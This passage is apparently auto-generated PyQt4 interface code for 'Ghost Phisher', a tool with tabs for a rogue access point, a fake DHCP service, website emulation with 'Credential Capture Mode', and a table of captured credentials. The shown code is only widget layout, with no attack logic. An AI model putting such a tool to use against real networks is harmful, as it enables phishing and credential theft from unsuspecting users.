        self.horizontalLayout_13.addWidget(self.dhcp_start)
        spacerItem23 = QtGui.QSpacerItem(40, 20, QtGui.QSizePolicy.Expanding, QtGui.QSizePolicy.Minimum)
        self.horizontalLayout_13.addItem(spacerItem23)
        self.dhcp_stop = QtGui.QPushButton(self.tab_2)
        self.dhcp_stop.setObjectName(_fromUtf8("dhcp_stop"))
        self.horizontalLayout_13.addWidget(self.dhcp_stop)
        spacerItem24 = QtGui.QSpacerItem(40, 20, QtGui.QSizePolicy.Expanding, QtGui.QSizePolicy.Minimum)
        self.horizontalLayout_13.addItem(spacerItem24)
        self.verticalLayout_7.addLayout(self.horizontalLayout_13)
        self.verticalLayout_26.addLayout(self.verticalLayout_7)
        self.tabWidget.addTab(self.tab_2, _fromUtf8(""))
        self.tab = QtGui.QWidget()
        self.tab.setObjectName(_fromUtf8("tab"))
        self.verticalLayout_17 = QtGui.QVBoxLayout(self.tab)
        self.verticalLayout_17.setObjectName(_fromUtf8("verticalLayout_17"))
        self.groupBox_7 = QtGui.QGroupBox(self.tab)
        self.groupBox_7.setObjectName(_fromUtf8("groupBox_7"))
        self.verticalLayout_11 = QtGui.QVBoxLayout(self.groupBox_7)
        self.verticalLayout_11.setObjectName(_fromUtf8("verticalLayout_11"))
        self.horizontalLayout_7 = QtGui.QHBoxLayout()
        self.horizontalLayout_7.setObjectName(_fromUtf8("horizontalLayout_7"))
        self.http_interface_combo = QtGui.QComboBox(self.groupBox_7)
        self.http_interface_combo.setObjectName(_fromUtf8("http_interface_combo"))
        self.horizontalLayout_7.addWidget(self.http_interface_combo)
        spacerItem25 = QtGui.QSpacerItem(102, 20, QtGui.QSizePolicy.Fixed, QtGui.QSizePolicy.Minimum)
        self.horizontalLayout_7.addItem(spacerItem25)
        self.http_ip_combo = QtGui.QComboBox(self.groupBox_7)
        sizePolicy = QtGui.QSizePolicy(QtGui.QSizePolicy.Preferred, QtGui.QSizePolicy.Preferred)
        sizePolicy.setHorizontalStretch(0)
        sizePolicy.setVerticalStretch(16)
        sizePolicy.setHeightForWidth(self.http_ip_combo.sizePolicy().hasHeightForWidth())
        self.http_ip_combo.setSizePolicy(sizePolicy)
        self.http_ip_combo.setObjectName(_fromUtf8("http_ip_combo"))
        self.horizontalLayout_7.addWidget(self.http_ip_combo)
        self.verticalLayout_11.addLayout(self.horizontalLayout_7)
        self.horizontalLayout_15 = QtGui.QHBoxLayout()
        self.horizontalLayout_15.setObjectName(_fromUtf8("horizontalLayout_15"))
        self.current_card_label_2 = QtGui.QLabel(self.groupBox_7)
        self.current_card_label_2.setObjectName(_fromUtf8("current_card_label_2"))
        self.horizontalLayout_15.addWidget(self.current_card_label_2)
        spacerItem26 = QtGui.QSpacerItem(70, 20, QtGui.QSizePolicy.Expanding, QtGui.QSizePolicy.Minimum)
        self.horizontalLayout_15.addItem(spacerItem26)
        self.http_ip_label = QtGui.QLabel(self.groupBox_7)
        self.http_ip_label.setToolTip(_fromUtf8(""))
        self.http_ip_label.setObjectName(_fromUtf8("http_ip_label"))
        self.horizontalLayout_15.addWidget(self.http_ip_label)
        self.verticalLayout_11.addLayout(self.horizontalLayout_15)
        self.horizontalLayout_16 = QtGui.QHBoxLayout()
        self.horizontalLayout_16.setObjectName(_fromUtf8("horizontalLayout_16"))
        self.http_port_label = QtGui.QLabel(self.groupBox_7)
        self.http_port_label.setObjectName(_fromUtf8("http_port_label"))
        self.horizontalLayout_16.addWidget(self.http_port_label)
        spacerItem27 = QtGui.QSpacerItem(40, 20, QtGui.QSizePolicy.Expanding, QtGui.QSizePolicy.Minimum)
        self.horizontalLayout_16.addItem(spacerItem27)
        self.label_13 = QtGui.QLabel(self.groupBox_7)
        self.label_13.setObjectName(_fromUtf8("label_13"))
        self.horizontalLayout_16.addWidget(self.label_13)
        self.verticalLayout_11.addLayout(self.horizontalLayout_16)
        self.verticalLayout_17.addWidget(self.groupBox_7)
        self.groupBox_8 = QtGui.QGroupBox(self.tab)
        self.groupBox_8.setObjectName(_fromUtf8("groupBox_8"))
        self.verticalLayout_15 = QtGui.QVBoxLayout(self.groupBox_8)
        self.verticalLayout_15.setObjectName(_fromUtf8("verticalLayout_15"))
        self.horizontalLayout_19 = QtGui.QHBoxLayout()
        self.horizontalLayout_19.setObjectName(_fromUtf8("horizontalLayout_19"))
        self.emulate_website_radio = QtGui.QRadioButton(self.groupBox_8)
        self.emulate_website_radio.setObjectName(_fromUtf8("emulate_website_radio"))
        self.horizontalLayout_19.addWidget(self.emulate_website_radio)
        self.emulate_website_label = QtGui.QLineEdit(self.groupBox_8)
        self.emulate_website_label.setStatusTip(_fromUtf8(""))
        self.emulate_website_label.setInputMask(_fromUtf8(""))
        self.emulate_website_label.setText(_fromUtf8(""))
        self.emulate_website_label.setEchoMode(QtGui.QLineEdit.Normal)
        self.emulate_website_label.setDragEnabled(False)
        self.emulate_website_label.setReadOnly(False)
        self.emulate_website_label.setObjectName(_fromUtf8("emulate_website_label"))
        self.horizontalLayout_19.addWidget(self.emulate_website_label)
        self.verticalLayout_15.addLayout(self.horizontalLayout_19)
        self.horizontalLayout_20 = QtGui.QHBoxLayout()
        self.horizontalLayout_20.setObjectName(_fromUtf8("horizontalLayout_20"))
        self.select_website_radio = QtGui.QRadioButton(self.groupBox_8)
        self.select_website_radio.setChecked(True)
        self.select_website_radio.setObjectName(_fromUtf8("select_website_radio"))
        self.horizontalLayout_20.addWidget(self.select_website_radio)
        self.website_linedit = QtGui.QLineEdit(self.groupBox_8)
        self.website_linedit.setObjectName(_fromUtf8("website_linedit"))
        self.horizontalLayout_20.addWidget(self.website_linedit)
        self.website_button = QtGui.QPushButton(self.groupBox_8)
        self.website_button.setObjectName(_fromUtf8("website_button"))
        self.horizontalLayout_20.addWidget(self.website_button)
        self.verticalLayout_15.addLayout(self.horizontalLayout_20)
        self.horizontalLayout_11 = QtGui.QHBoxLayout()
        self.horizontalLayout_11.setObjectName(_fromUtf8("horizontalLayout_11"))
        self.label_25 = QtGui.QLabel(self.groupBox_8)
        self.label_25.setObjectName(_fromUtf8("label_25"))
        self.horizontalLayout_11.addWidget(self.label_25)
        self.lineEdit_2 = QtGui.QLineEdit(self.groupBox_8)
        self.lineEdit_2.setObjectName(_fromUtf8("lineEdit_2"))
        self.horizontalLayout_11.addWidget(self.lineEdit_2)
        self.horizontalLayout_43 = QtGui.QHBoxLayout()
        self.horizontalLayout_43.setObjectName(_fromUtf8("horizontalLayout_43"))
        self.run_webpage_port_radio = QtGui.QCheckBox(self.groupBox_8)
        self.run_webpage_port_radio.setObjectName(_fromUtf8("run_webpage_port_radio"))
        self.horizontalLayout_43.addWidget(self.run_webpage_port_radio)
        self.use_port_http = QtGui.QLineEdit(self.groupBox_8)
        sizePolicy = QtGui.QSizePolicy(QtGui.QSizePolicy.Fixed, QtGui.QSizePolicy.Fixed)
        sizePolicy.setHorizontalStretch(0)
        sizePolicy.setVerticalStretch(0)
        sizePolicy.setHeightForWidth(self.use_port_http.sizePolicy().hasHeightForWidth())
        self.use_port_http.setSizePolicy(sizePolicy)
        self.use_port_http.setObjectName(_fromUtf8("use_port_http"))
        self.horizontalLayout_43.addWidget(self.use_port_http)
        self.label_14 = QtGui.QLabel(self.groupBox_8)
        self.label_14.setObjectName(_fromUtf8("label_14"))
        self.horizontalLayout_43.addWidget(self.label_14)
        self.horizontalLayout_11.addLayout(self.horizontalLayout_43)
        self.verticalLayout_15.addLayout(self.horizontalLayout_11)
        self.horizontalLayout_21 = QtGui.QHBoxLayout()
        self.horizontalLayout_21.setObjectName(_fromUtf8("horizontalLayout_21"))
        spacerItem28 = QtGui.QSpacerItem(0, 0, QtGui.QSizePolicy.Fixed, QtGui.QSizePolicy.Minimum)
        self.horizontalLayout_21.addItem(spacerItem28)
        self.verticalLayout_15.addLayout(self.horizontalLayout_21)
        self.verticalLayout_17.addWidget(self.groupBox_8)
        self.groupBox_9 = QtGui.QGroupBox(self.tab)
        self.groupBox_9.setObjectName(_fromUtf8("groupBox_9"))
        self.verticalLayout_14 = QtGui.QVBoxLayout(self.groupBox_9)
        self.verticalLayout_14.setObjectName(_fromUtf8("verticalLayout_14"))
        self.horizontalLayout_22 = QtGui.QHBoxLayout()
        self.horizontalLayout_22.setObjectName(_fromUtf8("horizontalLayout_22"))
        spacerItem29 = QtGui.QSpacerItem(40, 20, QtGui.QSizePolicy.Expanding, QtGui.QSizePolicy.Minimum)
        self.horizontalLayout_22.addItem(spacerItem29)
        self.capture_radio = QtGui.QRadioButton(self.groupBox_9)
        self.capture_radio.setChecked(True)
        self.capture_radio.setObjectName(_fromUtf8("capture_radio"))
        self.horizontalLayout_22.addWidget(self.capture_radio)
        spacerItem30 = QtGui.QSpacerItem(40, 20, QtGui.QSizePolicy.Expanding, QtGui.QSizePolicy.Minimum)
        self.horizontalLayout_22.addItem(spacerItem30)
        self.hosting_radio = QtGui.QRadioButton(self.groupBox_9)
        self.hosting_radio.setObjectName(_fromUtf8("hosting_radio"))
        self.horizontalLayout_22.addWidget(self.hosting_radio)
        spacerItem31 = QtGui.QSpacerItem(40, 20, QtGui.QSizePolicy.Expanding, QtGui.QSizePolicy.Minimum)
        self.horizontalLayout_22.addItem(spacerItem31)
        self.verticalLayout_14.addLayout(self.horizontalLayout_22)
        self.verticalLayout_17.addWidget(self.groupBox_9)
        self.groupBox_10 = QtGui.QGroupBox(self.tab)
        self.groupBox_10.setToolTip(_fromUtf8(""))
        self.groupBox_10.setStatusTip(_fromUtf8(""))
        self.groupBox_10.setWhatsThis(_fromUtf8(""))
        self.groupBox_10.setObjectName(_fromUtf8("groupBox_10"))
        self.horizontalLayout_17 = QtGui.QHBoxLayout(self.groupBox_10)
        self.horizontalLayout_17.setObjectName(_fromUtf8("horizontalLayout_17"))
        self.status_textbrowser_http = QtGui.QTextBrowser(self.groupBox_10)
        self.status_textbrowser_http.setObjectName(_fromUtf8("status_textbrowser_http"))
        self.horizontalLayout_17.addWidget(self.status_textbrowser_http)
        self.verticalLayout_17.addWidget(self.groupBox_10)
        self.verticalLayout_13 = QtGui.QVBoxLayout()
        self.verticalLayout_13.setObjectName(_fromUtf8("verticalLayout_13"))
        self.verticalLayout_12 = QtGui.QVBoxLayout()
        self.verticalLayout_12.setObjectName(_fromUtf8("verticalLayout_12"))
        self.http_captured_credential = QtGui.QLabel(self.tab)
        self.http_captured_credential.setObjectName(_fromUtf8("http_captured_credential"))
        self.verticalLayout_12.addWidget(self.http_captured_credential)
        self.http_captured_credential_2 = QtGui.QLabel(self.tab)
        self.http_captured_credential_2.setObjectName(_fromUtf8("http_captured_credential_2"))
        self.verticalLayout_12.addWidget(self.http_captured_credential_2)
        self.verticalLayout_13.addLayout(self.verticalLayout_12)
        self.horizontalLayout_18 = QtGui.QHBoxLayout()
        self.horizontalLayout_18.setObjectName(_fromUtf8("horizontalLayout_18"))
        spacerItem32 = QtGui.QSpacerItem(40, 20, QtGui.QSizePolicy.Expanding, QtGui.QSizePolicy.Minimum)
        self.horizontalLayout_18.addItem(spacerItem32)
        self.http_start = QtGui.QPushButton(self.tab)
        self.http_start.setObjectName(_fromUtf8("http_start"))
        self.horizontalLayout_18.addWidget(self.http_start)
        spacerItem33 = QtGui.QSpacerItem(40, 20, QtGui.QSizePolicy.Expanding, QtGui.QSizePolicy.Minimum)
        self.horizontalLayout_18.addItem(spacerItem33)
        self.http_stop = QtGui.QPushButton(self.tab)
        self.http_stop.setObjectName(_fromUtf8("http_stop"))
        self.horizontalLayout_18.addWidget(self.http_stop)
        spacerItem34 = QtGui.QSpacerItem(40, 20, QtGui.QSizePolicy.Expanding, QtGui.QSizePolicy.Minimum)
        self.horizontalLayout_18.addItem(spacerItem34)
        self.verticalLayout_13.addLayout(self.horizontalLayout_18)
        self.verticalLayout_17.addLayout(self.verticalLayout_13)
        self.tabWidget.addTab(self.tab, _fromUtf8(""))
        self.tab_3 = QtGui.QWidget()
        self.tab_3.setObjectName(_fromUtf8("tab_3"))
        self.horizontalLayout_28 = QtGui.QHBoxLayout(self.tab_3)
        self.horizontalLayout_28.setObjectName(_fromUtf8("horizontalLayout_28"))
        self.verticalLayout_22 = QtGui.QVBoxLayout()
        self.verticalLayout_22.setObjectName(_fromUtf8("verticalLayout_22"))
        self.credential_table = QtGui.QTableWidget(self.tab_3)
        self.credential_table.setObjectName(_fromUtf8("credential_table"))
        self.credential_table.setColumnCount(3)
        self.credential_table.setRowCount(0)
        item = QtGui.QTableWidgetItem()
        self.credential_table.setHorizontalHeaderItem(0, item)
        item = QtGui.QTableWidgetItem()
        self.credential_table.setHorizontalHeaderItem(1, item)
        item = QtGui.QTableWidgetItem()
        self.credential_table.setHorizontalHeaderItem(2, item)
        self.verticalLayout_22.addWidget(self.credential_table)
        spacerItem35 = QtGui.QSpacerItem(15, 6, QtGui.QSizePolicy.Minimum, QtGui.QSizePolicy.Fixed)
        self.verticalLayout_22.addItem(spacerItem35)
        self.horizontalLayout_26 = QtGui.QHBoxLayout()
        self.horizontalLayout_26.setObjectName(_fromUtf8("horizontalLayout_26"))
        spacerItem36 = QtGui.QSpacerItem(40, 20, QtGui.QSizePolicy.Expanding, QtGui.QSizePolicy.Minimum)
        self.horizontalLayout_26.addItem(spacerItem36)
        self.savechanges_button = QtGui.QPushButton(self.tab_3)
        self.savechanges_button.setObjectName(_fromUtf8("savechanges_button"))
        self.horizontalLayout_26.addWidget(self.savechanges_button)
        spacerItem37 = QtGui.QSpacerItem(40, 20, QtGui.QSizePolicy.Expanding, QtGui.QSizePolicy.Minimum)
        self.horizontalLayout_26.addItem(spacerItem37)
        self.insert_button = QtGui.QPushButton(self.tab_3)
        self.insert_button.setObjectName(_fromUtf8("insert_button"))
        self.horizontalLayout_26.addWidget(self.insert_button)
        spacerItem38 = QtGui.QSpacerItem(40, 20, QtGui.QSizePolicy.Expanding, QtGui.QSizePolicy.Minimum)
        self.horizontalLayout_26.addItem(spacerItem38)
        self.delete_button = QtGui.QPushButton(self.tab_3)
        self.delete_button.setObjectName(_fromUtf8("delete_button"))
        self.horizontalLayout_26.addWidget(self.delete_button)
        spacerItem39 = QtGui.QSpacerItem(40, 20, QtGui.QSizePolicy.Expanding, QtGui.QSizePolicy.Minimum)
        self.horizontalLayout_26.addItem(spacerItem39)
        self.verticalLayout_22.addLayout(self.horizontalLayout_26)
        self.horizontalLayout_28.addLayout(self.verticalLayout_22)
        self.tabWidget.addTab(self.tab_3, _fromUtf8(""))
        self.tab_4 = QtGui.QWidget()
        self.tab_4.setObjectName(_fromUtf8("tab_4"))
        self.horizontalLayout_27 = QtGui.QHBoxLayout(self.tab_4)
        self.horizontalLayout_27.setObjectName(_fromUtf8("horizontalLayout_27"))
        self.verticalLayout_21 = QtGui.QVBoxLayout()
        self.verticalLayout_21.setObjectName(_fromUtf8("verticalLayout_21"))
        self.groupBox_13 = QtGui.QGroupBox(self.tab_4)
        self.groupBox_13.setObjectName(_fromUtf8("groupBox_13"))
        self.horizontalLayout_23 = QtGui.QHBoxLayout(self.groupBox_13)
        self.horizontalLayout_23.setObjectName(_fromUtf8("horizontalLayout_23"))
        self.verticalLayout_20 = QtGui.QVBoxLayout()
        self.verticalLayout_20.setObjectName(_fromUtf8("verticalLayout_20"))
        self.label_17 = QtGui.QLabel(self.groupBox_13)
        self.label_17.setObjectName(_fromUtf8("label_17"))
        self.verticalLayout_20.addWidget(self.label_17)
        spacerItem40 = QtGui.QSpacerItem(23, 0, QtGui.QSizePolicy.Minimum, QtGui.QSizePolicy.Fixed)
        self.verticalLayout_20.addItem(spacerItem40)
        self.label_18 = QtGui.QLabel(self.groupBox_13)
        self.label_18.setObjectName(_fromUtf8("label_18"))
        self.verticalLayout_20.addWidget(self.label_18)
        spacerItem41 = QtGui.QSpacerItem(20, 0, QtGui.QSizePolicy.Minimum, QtGui.QSizePolicy.Fixed)
        self.verticalLayout_20.addItem(spacerItem41)
        self.label_20 = QtGui.QLabel(self.groupBox_13)
        self.label_20.setObjectName(_fromUtf8("label_20"))
        self.verticalLayout_20.addWidget(self.label_20)
        spacerItem42 = QtGui.QSpacerItem(20, 0, QtGui.QSizePolicy.Minimum, QtGui.QSizePolicy.Fixed)
        self.verticalLayout_20.addItem(spacerItem42)
        self.label_19 = QtGui.QLabel(self.groupBox_13)
        self.label_19.setObjectName(_fromUtf8("label_19"))
        self.verticalLayout_20.addWidget(self.label_19)
        self.horizontalLayout_23.addLayout(self.verticalLayout_20)
        self.verticalLayout_21.addWidget(self.groupBox_13)
        self.groupBox_11 = QtGui.QGroupBox(self.tab_4)
        self.groupBox_11.setObjectName(_fromUtf8("groupBox_11"))
        self.horizontalLayout_24 = QtGui.QHBoxLayout(self.groupBox_11)
        self.horizontalLayout_24.setObjectName(_fromUtf8("horizontalLayout_24"))
        self.verticalLayout_18 = QtGui.QVBoxLayout()
        self.verticalLayout_18.setObjectName(_fromUtf8("verticalLayout_18"))
        self.label_21 = QtGui.QLabel(self.groupBox_11)
        self.label_21.setObjectName(_fromUtf8("label_21"))
        self.verticalLayout_18.addWidget(self.label_21)
        self.label_22 = QtGui.QLabel(self.groupBox_11)
        self.label_22.setObjectName(_fromUtf8("label_22"))
        self.verticalLayout_18.addWidget(self.label_22)
        self.label_23 = QtGui.QLabel(self.groupBox_11)
        self.label_23.setObjectName(_fromUtf8("label_23"))
        self.verticalLayout_18.addWidget(self.label_23)
        spacerItem43 = QtGui.QSpacerItem(20, 0, QtGui.QSizePolicy.Minimum, QtGui.QSizePolicy.Fixed)
        self.verticalLayout_18.addItem(spacerItem43)
        spacerItem44 = QtGui.QSpacerItem(20, 0, QtGui.QSizePolicy.Minimum, QtGui.QSizePolicy.Fixed)
        self.verticalLayout_18.addItem(spacerItem44)
        self.horizontalLayout_24.addLayout(self.verticalLayout_18)
        self.verticalLayout_21.addWidget(self.groupBox_11)
        self.groupBox_12 = QtGui.QGroupBox(self.tab_4)
        self.groupBox_12.setObjectName(_fromUtf8("groupBox_12"))
        self.horizontalLayout_25 = QtGui.QHBoxLayout(self.groupBox_12)
        self.horizontalLayout_25.setObjectName(_fromUtf8("horizontalLayout_25"))
        self.verticalLayout_19 = QtGui.QVBoxLayout()
        self.verticalLayout_19.setObjectName(_fromUtf8("verticalLayout_19"))
        spacerItem45 = QtGui.QSpacerItem(20, 0, QtGui.QSizePolicy.Minimum, QtGui.QSizePolicy.Fixed)
        self.verticalLayout_19.addItem(spacerItem45)
        self.horizontalLayout_44 = QtGui.QHBoxLayout()
        self.horizontalLayout_44.setObjectName(_fromUtf8("horizontalLayout_44"))
        self.label_15 = QtGui.QLabel(self.groupBox_12)
        self.label_15.setObjectName(_fromUtf8("label_15"))
        self.horizontalLayout_44.addWidget(self.label_15)
        spacerItem46 = QtGui.QSpacerItem(40, 20, QtGui.QSizePolicy.Expanding, QtGui.QSizePolicy.Minimum)
        self.horizontalLayout_44.addItem(spacerItem46)
        self.label_26 = QtGui.QLabel(self.groupBox_12)
        self.label_26.setText(_fromUtf8(""))
        self.label_26.setObjectName(_fromUtf8("label_26"))
        self.horizontalLayout_44.addWidget(self.label_26)
        spacerItem47 = QtGui.QSpacerItem(300, 20, QtGui.QSizePolicy.Fixed, QtGui.QSizePolicy.Minimum)
        self.horizontalLayout_44.addItem(spacerItem47)
        self.verticalLayout_19.addLayout(self.horizontalLayout_44)
        self.horizontalLayout_45 = QtGui.QHBoxLayout()
        self.horizontalLayout_45.setObjectName(_fromUtf8("horizontalLayout_45"))
        self.label_27 = QtGui.QLabel(self.groupBox_12)
        self.label_27.setObjectName(_fromUtf8("label_27"))
        self.horizontalLayout_45.addWidget(self.label_27)
        spacerItem48 = QtGui.QSpacerItem(40, 20, QtGui.QSizePolicy.Expanding, QtGui.QSizePolicy.Minimum)
        self.horizontalLayout_45.addItem(spacerItem48)
        self.label_28 = QtGui.QLabel(self.groupBox_12)
        self.label_28.setText(_fromUtf8(""))
        self.label_28.setObjectName(_fromUtf8("label_28"))
        self.horizontalLayout_45.addWidget(self.label_28)
        spacerItem49 = QtGui.QSpacerItem(300, 20, QtGui.QSizePolicy.Fixed, QtGui.QSizePolicy.Minimum)
        self.horizontalLayout_45.addItem(spacerItem49)
        self.verticalLayout_19.addLayout(self.horizontalLayout_45)
        spacerItem50 = QtGui.QSpacerItem(20, 10, QtGui.QSizePolicy.Minimum, QtGui.QSizePolicy.Fixed)
        self.verticalLayout_19.addItem(spacerItem50)
        self.label_16 = QtGui.QLabel(self.groupBox_12)
        font = QtGui.QFont()
        font.setWeight(50)
        font.setBold(False)
        self.label_16.setFont(font)
        self.label_16.setObjectName(_fromUtf8("label_16"))
        self.verticalLayout_19.addWidget(self.label_16)
        self.label_24 = QtGui.QLabel(self.groupBox_12)
        font = QtGui.QFont()
        font.setWeight(50)
        font.setBold(False)
        self.label_24.setFont(font)
        self.label_24.setText(_fromUtf8(""))
        self.label_24.setObjectName(_fromUtf8("label_24"))
        self.verticalLayout_19.addWidget(self.label_24)
        spacerItem51 = QtGui.QSpacerItem(24, 13, QtGui.QSizePolicy.Minimum, QtGui.QSizePolicy.Fixed)
        self.verticalLayout_19.addItem(spacerItem51)
        self.horizontalLayout_25.addLayout(self.verticalLayout_19)
        self.verticalLayout_21.addWidget(self.groupBox_12)
        self.horizontalLayout_27.addLayout(self.verticalLayout_21)
        self.tabWidget.addTab(self.tab_4, _fromUtf8(""))
        self.verticalLayout_10.addWidget(self.tabWidget)
        ghost_phisher.setCentralWidget(self.centralwidget)

        self.scene = QtGui.QGraphicsScene()
        self.scene.addPixmap(QtGui.QPixmap('%s/gui/images/banner.png'%(cwd)))
        self.graphicsView.setScene(self.scene)
        factor = 60 / 100.0
        matrix = self.graphicsView.matrix()
        matrix.reset()
        matrix.scale(factor, factor)
        self.graphicsView.setMatrix(matrix)
        self.retranslateUi(ghost_phisher)
        self.tabWidget.setCurrentIndex(0)
        QtCore.QMetaObject.connectSlotsByName(ghost_phisher)
        self.retranslateUi(ghost_phisher)
        self.tabWidget.setCurrentIndex(0)
        QtCore.QMetaObject.connectSlotsByName(ghost_phisher)


    def retranslateUi(self, ghost_phisher):
        ghost_phisher.setWindowTitle(QtGui.QApplication.translate("ghost_phisher", "Ghost Phisher", None, QtGui.QApplication.UnicodeUTF8))
        self.groupBox_15.setTitle(QtGui.QApplication.translate("ghost_phisher", "Access Point Details", None, QtGui.QApplication.UnicodeUTF8))
        self.access_point_label.setText(QtGui.QApplication.translate("ghost_phisher", "Acess Point Name:", None, QtGui.QApplication.UnicodeUTF8))
        self.channel_label.setText(QtGui.QApplication.translate("ghost_phisher", "Channel:", None, QtGui.QApplication.UnicodeUTF8))
        self.ip_address_label.setText(QtGui.QApplication.translate("ghost_phisher", "IP address:", None, QtGui.QApplication.UnicodeUTF8))
        self.main_mac_address_label.setText(QtGui.QApplication.translate("ghost_phisher", "Mac Address:", None, QtGui.QApplication.UnicodeUTF8))
        self.access_runtime.setText(QtGui.QApplication.translate("ghost_phisher", "Runtime:", None, QtGui.QApplication.UnicodeUTF8))
        self.groupBox_14.setTitle(QtGui.QApplication.translate("ghost_phisher", "Wireless Interface ", None, QtGui.QApplication.UnicodeUTF8))
        self.label_25.setText(QtGui.QApplication.translate("ghost_phisher", "Real Website IP Address or Url:", None, QtGui.QApplication.UnicodeUTF8))
        self.groupBox_9.setTitle(QtGui.QApplication.translate("ghost_phisher", " Service Mode", None, QtGui.QApplication.UnicodeUTF8))
        self.label_25.setText(QtGui.QApplication.translate("ghost_phisher", "Real Website IP Address or Url:", None, QtGui.QApplication.UnicodeUTF8))
        self.capture_radio.setText(QtGui.QApplication.translate("ghost_phisher", "Credential Capture Mode", None, QtGui.QApplication.UnicodeUTF8))
        self.hosting_radio.setText(QtGui.QApplication.translate("ghost_phisher", "Hosting  Mode", None, QtGui.QApplication.UnicodeUTF8))
        self.comboBox.setToolTip(QtGui.QApplication.translate("ghost_phisher", "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.0//EN\" \"http://www.w3.org/TR/REC-html40/strict.dtd\">\n"
"<html><head><meta name=\"qrichtext\" content=\"1\" /><style type=\"text/css\">\n"
"p, li { white-space: pre-wrap; }\n"
"</style></head><body style=\" font-family:\'MS Shell Dlg 2\'; font-size:7pt; font-weight:400; font-style:normal;\">\n"
"<p style=\" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\">Select the wireless interface card you would like to use</p>\n"
"<p style=\"-qt-paragraph-type:empty; margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\"></p></body></html>", None, QtGui.QApplication.UnicodeUTF8))
        self.refresh_button.setToolTip(QtGui.QApplication.translate("ghost_phisher", "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.0//EN\" \"http://www.w3.org/TR/REC-html40/strict.dtd\">\n"
"<html><head><meta name=\"qrichtext\" content=\"1\" /><style type=\"text/css\">\n"
"p, li { white-space: pre-wrap; }\n"
"</style></head><body style=\" font-family:\'MS Shell Dlg 2\'; font-size:7pt; font-weight:400; font-style:normal;\">\n"
"<p style=\" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\">click to refresh list of newly inserted interface cards</p></body></html>", None, QtGui.QApplication.UnicodeUTF8))
        self.refresh_button.setText(QtGui.QApplication.translate("ghost_phisher", "   Refresh Card List  ", None, QtGui.QApplication.UnicodeUTF8))
        self.acess_interface.setText(QtGui.QApplication.translate("ghost_phisher", "Current Interface:", None, QtGui.QApplication.UnicodeUTF8))
        self.mac_address_label.setText(QtGui.QApplication.translate("ghost_phisher", "Mac Address:", None, QtGui.QApplication.UnicodeUTF8))
        self.driver_label.setText(QtGui.QApplication.translate("ghost_phisher", "Driver:", None, QtGui.QApplication.UnicodeUTF8))
        self.monitor_label.setText(QtGui.QApplication.translate("ghost_phisher", "Monitor:", None, QtGui.QApplication.UnicodeUTF8))
        self.monitor_button.setToolTip(QtGui.QApplication.translate("ghost_phisher", "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.0//EN\" \"http://www.w3.org/TR/REC-html40/strict.dtd\">\n"
"<html><head><meta name=\"qrichtext\" content=\"1\" /><style type=\"text/css\">\n"
"p, li { white-space: pre-wrap; }\n"
"</style></head><body style=\" font-family:\'MS Shell Dlg 2\'; font-size:7pt; font-weight:400; font-style:normal;\">\n"
"<p style=\" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\">click to place wirless card on monitor mode</p></body></html>", None, QtGui.QApplication.UnicodeUTF8))
        self.monitor_button.setText(QtGui.QApplication.translate("ghost_phisher", "Set Monitor", None, QtGui.QApplication.UnicodeUTF8))
        self.groupBox_16.setTitle(QtGui.QApplication.translate("ghost_phisher", "Access Point Settings", None, QtGui.QApplication.UnicodeUTF8))
        self.label_36.setText(QtGui.QApplication.translate("ghost_phisher", "SSID:", None, QtGui.QApplication.UnicodeUTF8))
        self.label_37.setText(QtGui.QApplication.translate("ghost_phisher", "IP Address:", None, QtGui.QApplication.UnicodeUTF8))
        self.access_name_edit.setToolTip(QtGui.QApplication.translate("ghost_phisher", "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.0//EN\" \"http://www.w3.org/TR/REC-html40/strict.dtd\">\n"
"<html><head><meta name=\"qrichtext\" content=\"1\" /><style type=\"text/css\">\n"
"p, li { white-space: pre-wrap; }\n"
"</style></head><body style=\" font-family:\'MS Shell Dlg 2\'; font-size:7pt; font-weight:400; font-style:normal;\">\n"
"<p style=\" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\">input the name of the access point</p></body></html>", None, QtGui.QApplication.UnicodeUTF8))
        self.ip_address_label_2.setToolTip(QtGui.QApplication.translate("ghost_phisher", "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.0//EN\" \"http://www.w3.org/TR/REC-html40/strict.dtd\">\n"
"<html><head><meta name=\"qrichtext\" content=\"1\" /><style type=\"text/css\">\n"
"p, li { white-space: pre-wrap; }\n"
"</style></head><body style=\" font-family:\'MS Shell Dlg 2\'; font-size:7pt; font-weight:400; font-style:normal;\">\n"
"<p style=\" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\">input an ip adress you would like to bind access point to e.g 192.168.0.1</p></body></html>", None, QtGui.QApplication.UnicodeUTF8))
        self.label_38.setText(QtGui.QApplication.translate("ghost_phisher", "Channel:     ", None, QtGui.QApplication.UnicodeUTF8))
        self.channel_combo.setToolTip(QtGui.QApplication.translate("ghost_phisher", "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.0//EN\" \"http://www.w3.org/TR/REC-html40/strict.dtd\">\n"
"<html><head><meta name=\"qrichtext\" content=\"1\" /><style type=\"text/css\">\n"
"p, li { white-space: pre-wrap; }\n"
"</style></head><body style=\" font-family:\'MS Shell Dlg 2\'; font-size:7pt; font-weight:400; font-style:normal;\">\n"
"<p style=\" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\">select the channel you would like the access point run (default is channel 1)</p></body></html>", None, QtGui.QApplication.UnicodeUTF8))
        self.groupBox_18.setTitle(QtGui.QApplication.translate("ghost_phisher", "Cryptography", None, QtGui.QApplication.UnicodeUTF8))
        self.rouge_radio.setText(QtGui.QApplication.translate("ghost_phisher", "None", None, QtGui.QApplication.UnicodeUTF8))
        self.wpa_radio.setText(QtGui.QApplication.translate("ghost_phisher", "WPA", None, QtGui.QApplication.UnicodeUTF8))
